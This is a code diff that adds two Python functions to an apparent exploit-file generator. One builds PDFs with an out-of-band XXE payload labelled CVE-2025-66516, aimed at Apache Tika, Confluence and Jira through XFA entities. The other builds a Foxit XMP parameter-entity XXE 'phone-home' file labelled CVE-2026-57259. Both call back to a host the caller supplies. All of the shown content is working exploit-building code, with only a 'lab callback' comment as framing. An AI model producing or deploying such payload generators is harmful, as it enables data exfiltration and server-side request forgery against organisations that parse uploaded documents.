@@ -268,3 +268,35 @@ startxref
 1100
 %%EOF
 ''')
+
+
+def write_tika_xfa_xxe_oob(filename, host):
+    """CVE-2025-66516 — Apache Tika / Confluence / Jira OOB XXE via XFA %entity."""
+    write_xfa_xxe_oob(filename, host)
+    with open(filename, "r", encoding="latin-1", errors="ignore") as fh:
+        data = fh.read()
+    data = data.replace("/test42-xxe-oob", "/cve-2025-66516-tika")
+    data = data.replace("xxe-oob-xfa", "tika-xxe-oob")
+    with open(filename, "w", encoding="latin-1", errors="ignore") as fh:
+        fh.write(data)
+
+
+def write_foxit_xxe_callback(filename, host):
+    """CVE-2026-57259 — Foxit XML/XXE phone-home via XMP parameter entity (lab callback)."""
+    import re
+
+    write_xxe_xmp_metadata(filename, host)
+    with open(filename, "r", encoding="latin-1", errors="ignore") as fh:
+        data = fh.read()
+    data = data.replace("/test36-xxe-xmp", "/cve-2026-57259-foxit")
+    data = data.replace("<!ENTITY xxe SYSTEM", "<!ENTITY % foxitxxe SYSTEM")
+    data = data.replace("]>\n<x:xmpmeta", "  %foxitxxe;\n]>\n<x:xmpmeta")
+    data = data.replace("<!DOCTYPE foo", "<!DOCTYPE foxit")
+    data = data.replace("&xxe;", "foxit-xxe")
+    data = data.replace("xxe-xmp", "foxit-xxe")
+    match = re.search(r"/Subtype /XML\s*/Length \d+\s*>>\s*stream\n(.*?)\nendstream", data, re.S)
+    if match:
+        payload = match.group(1)
+        data = re.sub(r"(/Subtype /XML\s*/Length )\d+", r"\g<1>" + str(len(payload)), data, count=1)
+    with open(filename, "w", encoding="latin-1", errors="ignore") as fh:
+        fh.write(data)
